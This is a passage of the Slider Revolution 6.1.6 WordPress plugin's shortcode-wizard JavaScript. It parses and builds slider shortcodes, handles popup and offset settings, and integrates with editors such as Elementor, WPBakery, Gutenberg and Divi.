/*!
 * REVOLUTION 6.1.6 
 * @version: 1.0 (29.11.2019)
 * @author ThemePunch
*/

/**********************************
	-	GLOBAL VARIABLES	-
**********************************/
;window.RVS = window.RVS === undefined ? {} : window.RVS;
RVS.F = RVS.F === undefined ? {} : RVS.F;
RVS.ENV = RVS.ENV === undefined ? {} : RVS.ENV;
RVS.LIB = RVS.LIB === undefined ? {} : RVS.LIB;
RVS.V = RVS.V === undefined ? {} : RVS.V;
RVS.S = RVS.S === undefined ? {} : RVS.S;
RVS.C = RVS.C === undefined ? {} : RVS.C;
RVS.WIN = RVS.WIN === undefined ? jQuery(window) : RVS.WIN;

RVS.DOC = RVS.DOC === undefined ? jQuery(document) : RVS.DOC;
RVS.OZ = RVS.OZ === undefined ? {} : RVS.OZ;
RVS.SC = RVS.SC === undefined ? {} : RVS.SC;

(function() {
	RVS.V.sizes = RVS.V.sizes==undefined ? ["d","n","t","m"] : RVS.V.sizes;
	RVS.V.dirs = RVS.V.dirs==undefined ? ["top","bottom","left","right"] : RVS.V.dirs;
	RVS.V.dirN = RVS.V.dirN==undefined ? {t:"top",b:"bottom",l:"left",r:"right"} : RVS.V.dirN;
	/*
	DEFINE SHORTCODE FUNCTIONS
	*/
	RVS.SC = RS_SC_WIZARD = {	

		/*
		INITIALISE SHORTCODE MANAGER
		*/
		init : function() {						
			if(typeof QTags !== 'undefined') {			
				var add_rs_button = true;
				if(typeof edButtons !== 'undefined') 
					for(var key in edButtons) {
						if(!edButtons.hasOwnProperty(key) || add_rs_button===false) continue;
						if(edButtons[key].id == 'slider-revolution') add_rs_button = false;							
					}
				
				if(add_rs_button) QTags.addButton('slider-revolution', 'Slider Revolution', function() {RVS.SC.openTemplateLibrary('qtags');});								
			}
			
			if(typeof RVS.LIB.OBJ !== 'undefined' && RVS.LIB.OBJ && RVS.LIB.OBJ.items && RVS.LIB.OBJ.items.length) RVS.SC.defaultAlias = RVS.LIB.OBJ.items[0].alias;						

			// INIT HOOKS AND GET EDITOR TYPE
			elementorHooks();
			vcHooks();
			shortCodeListener();			
		},

		/*
		PARSE SHORTCODE
		*/
		parseShortCode : function(e){
			if (e===undefined) return;
			var t,T,E,a=/(\s+|\W)|(\w+)/g,s="",n="NOT STARTED",r={name:"",attributes:{},content:""},i=(e.match(/\]/g)||[]).length;if(2<i)throw'invalid shortCode: match more then 2 tokens "]". Use only shortcode with this function. Example "[name]teste[/name]" or "[name prop=value]"';for(i=1!==i;null!=(t=a.exec(e))&&(T=t[0],"COMPLETE"!==n);)switch(n){case"NOT STARTED":"["==T&&(n="GETNAME");break;case"GETNAME":/\s/.test(T)?r.name&&(n="PARSING"):/\]/.test(T)?n="GETCONTENT":r.name+=T;break;case"GETCONTENT":/\[/.test(T)?r.name&&(n="COMPLETE"):r.content+=T;break;case"PARSING":if("]"==T)n=1===i?"COMPLETE":"GETCONTENT";else if("="==T){if(!s)throw'invalid token: "'+T+'" encountered at '+t.index;n="GET ATTRIBUTE VALUE"}else/\s/.test(T)?s&&(n="SET ATTRIBUTE"):s+=T;break;case"SET ATTRIBUTE":if(/\s/.test(T))r.attributes[s]=null;else{if("="!=T)throw'invalid token: "'+T+'" encountered at '+t.index;n="GET ATTRIBUTE VALUE"}break;case"GET ATTRIBUTE VALUE":/\s/.test(T)||(n=/["']/.test(T)?(E=T,r.attributes[s]="","GET QUOTED ATTRIBUTE VALUE"):(r.attributes[s]=T,s="","PARSING"));break;case"GET QUOTED ATTRIBUTE VALUE":/\\/.test(T)?n="ESCAPE VALUE":T==E?(n="PARSING",s=""):r.attributes[s]+=T;break;case"ESCAPE VALUE":/\\'"/.test(T)?r.attributes[s]+=T:r.attributes[s]+="\\"+T,n="GET QUOTED ATTRIBUTE VALUE"}return s&&!r.attributes[s]&&(r.attributes[s]=""),r
		},

		/*
		RETURN SHORTCODE TO BLOCK OBJECT
		*/
		scToBlock : function(sc) {			
			var parsed = RVS.SC.parseShortCode(sc);
			var atts = parsed===undefined ? {} : parsed.attributes,
				block = newBlock(atts.alias),
				a,i,j,v,m;			
			// MANAGE OFFSETS
			if (atts.offset!==undefined) {				
				a = atts.offset.split(';');					
				for (i in a) {
					v = a[i].split(":");
					if (v[0]!=="" && v[1]!==undefined) {
						m = v[1].split(",");												
						for (j in m) {
							block.offset[RVS.V.sizes[j]][RVS.V.dirN[v[0]]] = m[j];
							block.offset[RVS.V.sizes[j]]["use"] = true;							
						}
					}						
				}
			}
			// POP UP CHECK
			if (atts.usage && atts.usage==="modal") {
				block.usage = "modal";
				block.modal = true;
				if (atts.modal!==undefined) {
					a = atts.modal.split(";");
					for (i in a) {
						v = a[i].split(":");
						switch(v[0]) {
							case "t":block.popup.time.use = true;block.popup.time.v = v[1];break;
							case "s":block.popup.scroll.use = true;  block.popup.scroll.type="container"; block.popup.scroll.container = v[1]; break;
							case "so":block.popup.scroll.use = true;  block.popup.scroll.type="offset"; block.popup.scroll.v = v[1]; break;
							case "e":block.popup.event.use = true; block.popup.event.v = v[1]; break;
							case "ha":block.popup.hash.use = true; break;
							case "co":block.popup.cookie.use = true; block.popup.cookie.v = v[1]; break;
						}
					} 
				}
			}
			// MANAGE ZINDEX && LAYOUT
			if (atts.zindex!==undefined) block.zindex = atts.zindex;
			if (atts.layout!==undefined) block.layout = atts.layout;
			if (atts.slidertitle!==undefined) block.slidertitle = atts.slidertitle;
			else if (atts.sliderTitle!==undefined) block.slidertitle = atts.sliderTitle;
			else if (atts.title!==undefined) block.slidertitle = atts.title;
			return block;
		},
		
		

		updateBlockViews : function(show) {			
		
			if (show===true) jQuery('.rs_optimizer_button_wrapper').closest('.components-panel').addClass("rs_component_panel"); else jQuery('.rs_component_panel').removeClass("rs_component_panel");
		},

		buildShortCode : function() {
			RVS.SC.BLOCK.content = '[rev_slider alias="' + RVS.SC.BLOCK.alias + '"';
			RVS.SC.BLOCK.content += ' slidertitle="'+RVS.SC.BLOCK.slidertitle+'"';
			if (RVS.ENV.activated!==false) updateInherits(true);
			var popup = '', usage ='';
			if (RVS.SC.BLOCK.modal===true) {
				usage = 'modal';
				RVS.SC.BLOCK.content += ' usage="'+usage+'"';				
				if (RVS.SC.BLOCK.popup!==undefined && RVS.ENV.activated!==false) {						
					if (RVS.SC.BLOCK.popup.time!==undefined && RVS.SC.BLOCK.popup.time.use) popup += 't:'+RVS.SC.BLOCK.popup.time.v+";";
					if (RVS.SC.BLOCK.popup.scroll!==undefined && RVS.SC.BLOCK.popup.scroll.use) if(RVS.SC.BLOCK.popup.scroll.type==="offset")  popup += 'so:'+RVS.SC.BLOCK.popup.scroll.v+";"; else popup += 's:'+RVS.SC.BLOCK.popup.scroll.container+";";					
					if (RVS.SC.BLOCK.popup.event!==undefined && RVS.SC.BLOCK.popup.event.use) popup += 'e:'+RVS.SC.BLOCK.popup.event.v+";";
					if (RVS.SC.BLOCK.popup.hash!==undefined && RVS.SC.BLOCK.popup.hash.use) popup += 'ha:t;';
					if (RVS.SC.BLOCK.popup.cookie!==undefined && RVS.SC.BLOCK.popup.cookie.use) popup += 'co:'+RVS.SC.BLOCK.popup.cookie.v+';';
					if (popup!=='') RVS.SC.BLOCK.content +=' modal="'+popup+'"';
				}
			} else {
				if (RVS.ENV.activated!==false) {
					if (RVS.SC.BLOCK.offsettext!==undefined && RVS.SC.BLOCK.offsettext.length>0) RVS.SC.BLOCK.content +=' offset="'+RVS.SC.BLOCK.offsettext+'"'; else RVS.SC.BLOCK.offsettext="";
					if (RVS.SC.BLOCK.zindex!==undefined && RVS.SC.BLOCK.zindex!=="" && RVS.SC.BLOCK.zindex!==0) RVS.SC.BLOCK.content += ' zindex="'+RVS.SC.BLOCK.zindex+'"';
				}
			}
			if (RVS.ENV.activated!==false && RVS.SC.BLOCK.layout !== RVS.SC.BLOCK.origlayout) RVS.SC.BLOCK.content += ' layout="'+RVS.SC.BLOCK.layout+'"';
						
			RVS.SC.BLOCK.content += '][/rev_slider]';
			delete RVS.SC.BLOCK.text;			
			return {popup:popup, usage:usage};
		},

		updateShortCode : function() {
			if (RVS!==undefined && RVS.SC!==undefined && RVS.SC.suppress) return;					
			var SC = RVS.SC.buildShortCode();			
			switch(RVS.SC.type) {					
				case 'wpbackery':														
					var temp = jQuery.extend(true,{},RVS.SC.BLOCK);					
					if (SC.usage==="modal") { 
						temp.usage = SC.usage;  temp.modal = SC.popup;delete temp.offset;delete temp.zimdex;
					} else {
						if (temp.offsettext!=="") temp.offset = RVS.SC.BLOCK.offsettext; else delete temp.offset;
						delete temp.usage; delete temp.modal;
					}

					if (temp.layout===temp.origlayout) delete temp.layout;					
					delete temp.offsettext; delete temp.origlayout;	delete temp.content; delete temp.popup;					
					RVS.SC.VC.model.save('params', temp);				
				break;
				
				case 'tinymce':				
					tinyMCE.activeEditor.selection.setContent(RVS.SC.BLOCK.content);				
				break;
				
				case 'elementor':				
					RVS.SC.suppress = true;				
					RVS.SC.EL.model.setSetting('revslidertitle',  RVS.SC.BLOCK.slidertitle);
					RVS.SC.EL.model.setSetting('shortcode', RVS.SC.BLOCK.content);					
					RVS.SC.EL.control.find('input[data-setting="shortcode"]').trigger('input');
					setTimeout(function() {RVS.SC.suppress = false;}, 500);									
				break;				
				case 'qtags':				
					QTags.insertContent(RVS.SC.BLOCK.content);				
				break;
				case 'gutenberg':					
					var obj = {slidertitle: RVS.SC.BLOCK.slidertitle, alias: RVS.SC.BLOCK.alias, modal: RVS.SC.BLOCK.modal ,  content: RVS.SC.BLOCK.content , zindex: RVS.SC.BLOCK.zindex , wrapperid: RVS.SC.BLOCK.wrapperid};					
					revslider_react.setState(obj);						
					revslider_react.props.setAttributes(obj);
					revslider_react.forceUpdate();
				break;
				case 'divi':
					revslider_divi.props._onChange(revslider_divi.props.name, RVS.SC.BLOCK.content);
					revslider_divi.setState(RVS.SC.BLOCK);
				break;
				default:break;
			}
		},
				
		openTemplateLibrary: function(type) {		
			// 5.0 to 6.0 update patch
			if(typeof RVS.LIB.OBJ === 'undefined') return;
			if (type==="tinymce") {
				RVS.SC.BLOCK = {};
			}						
			RVS.SC.type = type;
			if(!RVS.SC.libraryInited) {				
				RVS.SC.libraryInited = true;
				RVS.F.initObjectLibrary(true); 
				var oas = document.getElementById('obj_addsliderasmodal');
				if (oas!==null) {
					oas.style.display = 'inline-block';
					RVS.F.initOnOff(oas);	
				}
				
				
				
				jQuery(document.body).on('change', '#sel_olibrary_sorting', function() {										
					jQuery('#reset_objsorting').css((this.value === 'datedesc' ? {display: 'none'} : {display: 'inline-block', opacity: '1', visibility: 'visible'} ));
					if(this.dataset.evt!==undefined) RVS.DOC.trigger(this.dataset.evt, this.dataset.evtparam);					
				}).on('change', '#ol_pagination', function(e) {					
					if(this.dataset.evt!==undefined) RVS.DOC.trigger(this.dataset.evt,[e, this.value, this.dataset.evtparam]);				
				});			
			}
			
			var successObj = {modules: 'addRevSliderShortcode', event: 'selectRevSliderItem'};						
			jQuery('#obj_addsliderasmodal .tponoffwrap').addClass('off').find('input').prop('checked', false);
			RVS.F.openObjectLibrary({types: ['modules'], filter: 'all', selected: ['modules'], success: successObj});
			
			var folder = RVS.F.getCookie('rs6_wizard_folder');
			if(folder && folder !== -1 && folder !== '-1' && ((RVS.LIB.OBJ !==undefined && RVS.LIB.OBJ.items!==undefined && RVS.LIB.OBJ.items.modules!==undefined))) RVS.F.changeOLIBToFolder(folder);		
			
		},
		
		openBlockSettings : function(type,sc){			
			if (RVS===undefined || RVS.SC===undefined) return;
			if (RVS.ENV.activated!==true) RVS.F.showRegisterSliderInfo();
			if (sc===undefined && RVS.SC.BLOCK===undefined) return;			
			RVS.SC.BLOCK = sc!==undefined ?  RVS.SC.scToBlock(sc) : RVS.SC.BLOCK===undefined || RVS.SC.BLOCK.text===undefined ? RVS.SC.scToBlock(RVS.SC.BLOCK.content) : RVS.SC.scToBlock(RVS.SC.BLOCK.text);

			if (RVS!==undefined && RVS.SC!==undefined && RVS.SC.BLOCK!==undefined && RVS.SC.BLOCK.alias.length>0) {	
				RVS.SC.type = type;
				//Ajax Call to get the original Layout				
			      RVS.F.ajaxRequest('getSliderSizeLayout', { alias : RVS.SC.BLOCK.alias }, function(response) {    
			      	
			          if(response.success) {  
			          	if (response!==undefined && response.layout!==undefined) {
			          		response.layout = response.layout===undefined || response.layout==="" ? "auto" : response.layout;
			          		 RVS.SC.BLOCK.origlayout = response.layout;
			          		 RVS.SC.BLOCK.slidertitle = response.slidertitle!==undefined ? response.slidertitle : response.sliderTitle!==undefined ? response.sliderTitle : response.title!==undefined ? response.title : RVS.SC.BLOCK.slidertitle;			  
			                if(typeof RVS.SC.BLOCK.layout === "undefined" || RVS.SC.BLOCK.layout==="") RVS.SC.BLOCK.layout = RVS.SC.BLOCK.origlayout;
			          	}          				          			             
			            RVS.F.showWaitAMinute({fadeOut:0,text:RVS_LANG.loadingcontent});
			            RVS.C.RBBS = jQuery('#rbm_blocksettings');				
						RVS.F.initOnOff(RVS.C.RBBS);
						RVS.F.RSDialog.create({modalid:'#rbm_blocksettings', bgopacity:0.5});
						RVS.C.RBBS.RSScroll({wheelPropagation:false, suppressScrollX:true});
						RVS.F.RSDialog.center();			
						RVS.C.RBBS.find('.origlayout').hide();
						RVS.C.RBBS.find('.origlayout.origlayout_'+RVS.SC.BLOCK.origlayout).show();		
						
						if (RVS.SC.type==="wpbackery") {			
							setTimeout(RVS.F.RSDialog.center,19);
							setTimeout(RVS.F.RSDialog.center,50);
						}
						blockSettingsUpdate();
			          }
			      });										
		    } 		
		},

		openSliderEditor : function(alias) { if (alias!==undefined && alias.length>0) window.open(RVS.ENV.admin_url+"&view=slide&alias="+alias);},
		openOptimizer : function(alias){ if (alias!==undefined && alias.length>0) RVS.F.openOptimizer({alias:alias});}						
	};

	
	// INITIALISE PROCESSES
	var RVSSCINIT_once = false
	if (document.readyState === "loading") 
		document.addEventListener('readystatechange',function(){
			if ((document.readyState === "interactive" || document.readyState === "complete") && !RVSSCINIT_once) {
				RVSSCINIT_once = true;
				RVS.SC.init();
			}
		});
	else {
		RVSSCINIT_once = true;
		RVS.SC.init();
	}
		
	function updateInherits(novisual) {
		if (RVS==undefined || RVS.SC.BLOCK==undefined || RVS.SC.BLOCK.offset===undefined) return;
		var inh = {top:0, bottom:0, left:0, right:0},val,s,d,txt='',com,nxt;
		for (var j in RVS.V.dirs) {
			d = RVS.V.dirs[j];			
			com = false;					
			txt += RVS.V.dirs[j][0]+":";
			for (var i in RVS.V.sizes) {				
				s = RVS.V.sizes[i];	
				nxt = (s=="d" && (RVS.SC.BLOCK.offset.d.use || RVS.SC.BLOCK.offset.n.use || RVS.SC.BLOCK.offset.t.use || RVS.SC.BLOCK.offset.n.use)) || (s=="n" && (RVS.SC.BLOCK.offset.n.use || RVS.SC.BLOCK.offset.t.use || RVS.SC.BLOCK.offset.n.use)) || (s=="t" && (RVS.SC.BLOCK.offset.t.use || RVS.SC.BLOCK.offset.m.use)) || (s=="m" &&  RVS.SC.BLOCK.offset.m.use);
				if (com && nxt) txt +=',';
				com = true;
				if (novisual!==true) {
					var inp = jQuery("#rbm_blocksettings .scblockinput[data-r='offset."+s+"."+d+"']");
					if (inp[0]===undefined) continue;				
					inp[0].dataset.s = s;
				}
				if (RVS.SC.BLOCK.offset[s].use) {
					inh[d] = val = RVS.SC.BLOCK.offset[s][d];
					if (novisual!==true) inp[0].style.opacity = 1;
				} else {
					val = inh[d];
					if (novisual!==true) inp[0].style.opacity = 0.5;
				}								
				if (novisual!==true) inp[0].value = val;
				if (nxt) txt +=val; else com = false;
			}
			txt +=';'
		}		
		if (txt==="t:;b:;l:;r:;") txt="";
		RVS.SC.BLOCK.offsettext = txt;		
	}

	function newBlock(alias) {		
		alias = alias===undefined ? "" : alias;
		return new Object({
			alias:alias,
			zindex:0,
			popup: { time : {use:false, v:2000}, 
					 scroll : {use:false, type:"offset", v:2000,container:""},
					 event : {use:false, v:"popup_"+alias},
					 hash : {use:false},
					 cookie:{use:false,v:24}
					},
			offset: { d : {top:"0px", bottom:"0px", left:"0px", right:"0px" ,use:false}, 
					  n : {top:"0px", bottom:"0px", left:"0px", right:"0px",use:false}, 
					  t : {top:"0px", bottom:"0px", left:"0px", right:"0px",use:false}, 
					  m : {top:"0px", bottom:"0px", left:"0px", right:"0px",use:false}},
			modal: false
		})
	}

	function blockSettingsUpdate() {			
		RVS.F.updateEasyInputs({path:'SC.BLOCK.', container:'#rbm_blocksettings', root:RVS});
		RVS.F.updateAllOnOff();
		updateInherits();
		jQuery('.scblockinput').trigger('init');
		if (RVS.SC.BLOCK.popup!==undefined) {
			document.getElementById('srbs_scr_evt').innerHTML = RVS.SC.BLOCK.popup.event.v;
			document.getElementById('srbs_scr_hash').innerHTML = RVS.SC.BLOCK.alias;
			if (RVS.ENV.activated!==false) jQuery('.rb_not_on_notactive').removeClass("disabled"); else jQuery('.rb_not_on_notactive').addClass("disabled");
		}
	}

	function blockSettingsReset() {
		if (RVS.SC.BLOCK!==undefined) {
			RVS.SC.BLOCK.zindex = 0;
			RVS.SC.BLOCK.popup = { time : {use:false, v:2000}, scroll : {use:false, type:"offset", v:2000,container:""},event : {use:false, v:"popup_"+RVS.SC.BLOCK.alias}};
			RVS.SC.BLOCK.offset = { d : {top:"0px", bottom:"0px", left:"0px", right:"0px" ,use:false}, n : {top:"0px", bottom:"0px", left:"0px", right:"0px",use:false}, t : {top:"0px", bottom:"0px", left:"0px", right:"0px",use:false}, m : {top:"0px", bottom:"0px", left:"0px", right:"0px",use:false}};
			RVS.SC.BLOCK.modal = false;
		}
	}

/*
ELEMENTOR HOOKS
 */
	function elementorHooks() {

		if (typeof elementor!=="undefined"  && elementor.hooks!==undefined) {			
		
			elementor.hooks.addAction( 'panel/open_editor/widget/slider_revolution', function( panel, model, view ) {
				RVS.SC.type = "elementor";
				RVS.SC.EL = RVS.SC.EL===undefined ? {} : RVS.SC.EL;
				RVS.SC.EL.control = panel.$el.find('#elementor-controls');
				RVS.SC.EL.view = view;
				RVS.SC.EL.model = model;

				// CHECK ALIAS FOR FROM VERSION 6.1.6 +
				if (view!==undefined && view.container!==undefined && view.container.settings!==undefined && view.container.settings.attributes!==undefined) {
					
					if (view.container.settings.attributes.shortcode!==undefined) {
						RVS.SC.BLOCK = RVS.SC.scToBlock(view.container.settings.attributes.shortcode);
						// FALLBACK
						if (view.container.settings.attributes.revslidertitle!==undefined) RVS.SC.BLOCK.slidertitle = view.container.settings.attributes.revslidertitle;
						if (view.container.settings.attributes.modal!==undefined) RVS.SC.BLOCK.modal = view.container.settings.attributes.modal;

					} 
				}
				//STYLING ELEMNTOR TO LOOK MORE SLIDER REVOLUTION LIKE
				jQuery('.elementor-component-tab.elementor-panel-navigation-tab.elementor-tab-control-advanced').hide();
				RVS.SC.EL.control.addClass("rs-elementor-component-tab");				
			});

			// BASIC LISTENER
			window.elementorSelectRevSlider = function(e) {	if (e) RVS.SC.openTemplateLibrary('elementor'); else jQuery('button[data-event="themepunch.selectslider"]').trigger('click');}
			/*
			 FURTHER LISTNERS
			*/
			RVS.DOC.on('click', 'button[data-event="themepunch.selectslider"]', function() {RVS.SC.openTemplateLibrary('elementor');});
			RVS.DOC.on('click', 'button[data-event="themepunch.settingsslider"]',  function() {RVS.SC.openBlockSettings('elementor',(RVS.SC.EL.view!==undefined && RVS.SC.EL.view.container!==undefined && RVS.SC.EL.view.container.settings!==undefined && RVS.SC.EL.view.container.settings.attributes!==undefined && RVS.SC.EL.view.container.settings.attributes.shortcode!==undefined ? RVS.SC.EL.view.container.settings.attributes.shortcode : {}));});
			RVS.DOC.on('click', 'button[data-event="themepunch.editslider"]', function() {RVS.SC.openSliderEditor(RVS.SC.BLOCK.alias)});
			RVS.DOC.on('click', 'button[data-event="themepunch.optimizeslider"]', function() {RVS.SC.openOptimizer(RVS.SC.BLOCK.alias)});
		}		
	}

/*
VISUAL COMPOSER HOOKS
*/ 	 	
 	function vcHooks() {
 		function convertVCParamsToSC(params) { 		
	 		var temp = jQuery.extend(true,{},params),
	 			sc = '[rev_slider alias="' + temp.alias + '"';
	 		
	 		if (temp.slidertitle!==undefined) sc+= ' slidertitle="'+temp.slidertitle+'"'; else
	 		if (temp.sliderTitle!==undefined) sc+= ' slidertitle="'+temp.sliderTitle+'"'; else
	 		if (temp.title!==undefined) sc+= ' slidertitle="'+temp.title+'"'; 
			
			if (temp.modal!==undefined) sc+= ' modal="'+temp.modal+'"';
			if (temp.usage!==undefined) sc+= ' usage="'+temp.usage+'"';
			if (temp.offset!==undefined) sc+= ' offset="'+temp.offset+'"';
			if (temp.zindex!==undefined) sc+= ' zindex="'+temp.zindex+'"';
			if (temp.layout!==undefined) sc+= ' layout="'+temp.layout+'"';						
			sc += '][/rev_slider]';		
			return sc;
	 	}

	 	/*
		OPEN TEMPLATE LIBRARY FOR VC
		 */
		function VCopenTemplateLibrary(params) {		
			jQuery('.wpb-element-edit-modal').hide(); //hide the normal VC window and use own (old vc version)
			jQuery('#vc_properties-panel').hide(); //hide the normal VC window and use own (new vc version)		
			RVS.SC.BLOCK = RVS.SC.scToBlock(convertVCParamsToSC(params));
			RVS.SC.openTemplateLibrary('wpbackery');	
		}

		if (typeof vc==="undefined" || vc==undefined) return;
		window.VcSliderRevolution = vc.shortcode_view.extend({
			events: {
				'click > .vc_controls .vc_control_rev_optimizer': 'rs_optim',
				'click > .vc_controls .vc_control_rev_selector': 'rs_select',
				'click > .vc_controls .vc_control_rev_settings': 'rs_settings',
				'click .column_delete,.vc_control-btn-delete': 'deleteShortcode',
				'click .vc_control-btn-edit': 'editElement',
				'click .column_clone,.vc_control-btn-clone': 'clone',
				mousemove: "checkControlsPosition"
			},
			initialize: function() {return window.VcSliderRevolution.__super__.initialize.call(this);},
			render: function () { RVS.SC.VC = this;	if(vc.add_element_block_view.$el.is(':visible')) VCopenTemplateLibrary(this.model.get('params'));return window.VcSliderRevolution.__super__.render.call(this);},
			editElement: function() { RVS.SC.openSliderEditor(this.model.get('params').alias);},
			rs_select : function() { RVS.SC.VC = this;VCopenTemplateLibrary(this.model.get('params'));},
			rs_optim : function() { RVS.SC.openOptimizer(this.model.get('params').alias);},
			rs_settings : function() { RVS.SC.VC = this; RVS.SC.openBlockSettings('wpbackery',convertVCParamsToSC(this.model.get('params')));}
		});

		if(typeof(window.InlineShortcodeView) !== 'undefined') {			
			var rs_show_frontend_overlay = false;
			jQuery(window).on('vc_build', function() {				
				vc.add_element_block_view.$el.find('[data-element="rev_slider"]').on('click',function() {
					rs_show_frontend_overlay = true;
				});				
			});		
			window.InlineShortcodeView_rev_slider = window.InlineShortcodeView.extend({	
				events: {
					'click > .vc_controls .vc_control_rev_optimizer': 'rs_optim',
					'click > .vc_controls .vc_control_rev_selector': 'rs_select',
					'click > .vc_controls .vc_control_rev_settings': 'rs_settings',
					'click .column_delete,.vc_control-btn-delete': 'destroy',
					'click .vc_control-btn-edit': 'edit',					
					mousemove: "checkControlsPosition"
				},					
				render: function() {																
					RVS.SC.VC = this;					
					if(rs_show_frontend_overlay) VCopenTemplateLibrary(this.model.get('params'))
					window.InlineShortcodeView_rev_slider.__super__.render.call(this);					
					var mv = this.$controls.find('.vc_element-move');					
					if (this.$controls[0].getElementsByClassName('vc_control_rev_optimizer').length===0) jQuery('<a class="vc_control-btn vc_control_rev_optimizer" href="#" title="File Size Optimizer"><span class="vc_btn-content"><i class="revslider_vc_material-icons material-icons">flash_on</i></span></a>').insertAfter(mv);
					if (this.$controls[0].getElementsByClassName('vc_control_rev_settings').length===0) jQuery('<a class="vc_control-btn vc_control_rev_settings" href="#" title="Module Settings"><span class="vc_btn-content"><i class="revslider_vc_material-icons material-icons">tune</i></span></a>').insertAfter(mv);
					if (this.$controls[0].getElementsByClassName('vc_control_rev_selector').length===0) jQuery('<a class="vc_control-btn vc_control_rev_selector" href="#" title="Select New Slider Revolution 6 Module"><span class="vc_btn-content"><i class="revslider_vc_material-icons material-icons">cached</i></span></a>').insertAfter(mv);				
					if (this.$controls[0].getElementsByClassName('vc_control_rev_edit').length===0) mv.find('.vc_control-btn.vc_control-btn-edit').addClass('vc_control_rev_edit');
					this.$controls.find('.vc_control-btn-clone').hide();
					return this;					
				},
				rs_settings : function() { RVS.SC.VC = this; RVS.SC.openBlockSettings('wpbackery',convertVCParamsToSC(this.model.get('params'))); return false;},
				rs_optim : function() {	RVS.SC.openOptimizer(this.model.get('params').alias);return false;},				
				update: function(model) {	rs_show_frontend_overlay = false;window.InlineShortcodeView_rev_slider.__super__.update.call(this, model);return this;},
				edit: function() {	RVS.SC.openSliderEditor(this.model.get('params').alias);return false;},
				rs_select : function() { RVS.SC.VC = this;	VCopenTemplateLibrary(this.model.get('params'));return false; },			
			});		
		};

		/*
		LISTENERS
		*/
		RVS.DOC.on('mouseenter','.wpb_rev_slider.wpb_content_element.wpb_sortable',function() {
			//CHECK TOOLBAR OF VC
			var controls = jQuery(this.getElementsByClassName('vc_controls-cc')[0]);
			if (controls!==undefined) {
				var mv = controls.find('.vc_element-move');
				if (this.getElementsByClassName('vc_control_rev_optimizer').length===0) jQuery('<a class="vc_control-btn vc_control_rev_optimizer" href="#" title="File Size Optimizer"><span class="vc_btn-content"><i class="revslider_vc_material-icons material-icons">flash_on</i></span></a>').insertAfter(mv);
				if (this.getElementsByClassName('vc_control_rev_settings').length===0) jQuery('<a class="vc_control-btn vc_control_rev_settings" href="#" title="Module Settings"><span class="vc_btn-content"><i class="revslider_vc_material-icons material-icons">tune</i></span></a>').insertAfter(mv);
				if (this.getElementsByClassName('vc_control_rev_selector').length===0) jQuery('<a class="vc_control-btn vc_control_rev_selector" href="#" title="Select New Slider Revolution 6 Module"><span class="vc_btn-content"><i class="revslider_vc_material-icons material-icons">cached</i></span></a>').insertAfter(mv);				
				if (this.getElementsByClassName('vc_control_rev_edit').length===0) mv.find('.vc_control-btn.vc_control-btn-edit').addClass('vc_control_rev_edit');				
			}
		});				
	}
	
	function shortCodeListener() {		
		if (RVS.S.shortCodeListener!==undefined) return;		
		RVS.S.shortCodeListener = true;

		// COOKIE HANDLING
		jQuery(document.body).on('click', '#objectlibrary *[data-folderid]', function() {RVS.F.setCookie("rs6_wizard_folder",this.dataset.folderid,360);});

		// 
		var _str = document.getElementById('slide_template_row') ;
		if (_str!==null) {		
			_str.style.display = 'inline-block';
			RVS.F.initOnOff(_str);
		}

		RVS.DOC.on('click','.rs_lib_premium_red',RVS.F.showRegisterSliderInfo);
		
		RVS.DOC.on('registrationdone',function() {
			if (RVS.ENV.activated===false) {
				jQuery('.rs_wp_plg_act_wrapper').show(); 
				jQuery('.rb_not_on_notactive').addClass("disabled");
			} else {
				jQuery('.rs_wp_plg_act_wrapper').hide();
				jQuery('.rb_not_on_notactive').removeClass("disabled");
			}			
		});
		
		if (RVS.ENV.activated===false) {
			jQuery('.rs_wp_plg_act_wrapper').show();
			RVS.DOC.on('click','.rs_wp_plg_act_wrapper',RVS.F.showRegisterSliderInfo);			
		} else {
			jQuery('.rs_wp_plg_act_wrapper').hide();
		}

		/**********************************
			-	PAGE BACKGROUND	COLOR   -
		**********************************/
		// Color Picker
		jQuery('#rs_page_bg_color').rsColorPicker({
			init: function(inputWrap, inputElement, cssColor, widgetSettings) {								
				var ghost = jQuery('<input type="text" class="layerinput" value="' + inputElement.val() + '">').appendTo(inputWrap);								
				inputElement.data('ghost', ghost).hide();				
			},
			change:function(currentInput, cssColor, gradient, globalColors, globalColorActive) {				
				currentInput.data('ghost').val(cssColor);
				currentInput.val(cssColor);
			}
		});			

		// Page Template , Color Picker, checkbox check only when RevSlider Blank Template
		jQuery(document.body).on('change', '.editor-page-attributes__template select', function() {
			if(jQuery(this).val() === "../public/views/revslider-page-template.php"){
				jQuery('#rs_page_bg_color_column').show(); 
				jQuery('#rs_blank_template').prop('checked', true);
			}
			else {
				jQuery('#rs_page_bg_color_column').hide();									
				jQuery('#rs_blank_template').prop('checked', false);
			}
		});
		
		// Page Template , checkbox check sync Page Template Selectbox
		jQuery(document.body).on('change', '#rs_blank_template', function() {
			if(jQuery(this).prop('checked')){
				jQuery('.editor-page-attributes__template select').val("../public/views/revslider-page-template.php").change(); 
				jQuery('#rs_page_bg_color_column').show(); 
			}
			else {
				jQuery('.editor-page-attributes__template select').val("").change();
				jQuery('#rs_page_bg_color_column').hide();
			}
		});

							
		/*
		DEFAULT LISTENERS
		 */
		RVS.DOC.on('click','.block-editor-editor-skeleton__content, .interface-interface-skeleton__content', function() {RVS.SC.updateBlockViews(true);});		
		RVS.DOC.on('addRevSliderShortcode', function(e, data) {				
			if(data!==undefined && data.alias !== '-1'){
				data.size = data.size==="" || data.size===undefined ? "auto" : data.size;				
				var block = newBlock(data.alias);				
				RVS.SC.BLOCK = jQuery.extend(true,block,RVS.SC.BLOCK);
				RVS.SC.BLOCK.alias = data.alias;				
				RVS.SC.BLOCK.slidertitle = data.slidertitle!==undefined ? data.slidertitle : data.title!==undefined ? data.title : data.alias;				
				RVS.SC.BLOCK.layout = RVS.SC.BLOCK.origlayout = data.size;				 
				RVS.SC.updateShortCode();
			}		
		});

		RVS.DOC.on('selectRevSliderItem', function() {		
			var folder = RVS.F.getCookie('rs6_wizard_folder');		
			if(folder && folder !== -1 && folder !== '-1') RVS.F.changeOLIBToFolder(folder);			
		});

		
		// CLOSE EDITOR
		RVS.DOC.on('click','#rbm_blocksettings .rbm_close' , function() {
			RVS.SC.updateShortCode();											
			RVS.F.RSDialog.close();
		});
				
		RVS.DOC.on('focus','.scblockinput',function() {						
			this.dataset.focusvalue = this.value;
			this.style.opacity = 1;
		});

		RVS.DOC.on('change blur','.scblockinput',function() {			
